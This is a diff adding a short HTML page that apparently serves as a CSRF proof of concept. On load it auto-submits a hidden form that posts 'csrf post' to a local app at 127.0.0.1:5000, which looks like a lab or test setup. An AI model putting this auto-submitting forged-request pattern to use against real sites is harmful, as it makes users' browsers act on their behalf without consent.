@@ -1,0 +1,10 @@
+<html lang="en">
+<body>
+<form id='badform' action = 'http://127.0.0.1:5000/homepage_action' method = 'post'>
+    <textarea id='inputtext' name='inputtext' rows='2' cols='100'>csrf post</textarea>
+    <br>
+    <input type = 'submit' value = 'Submit' />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
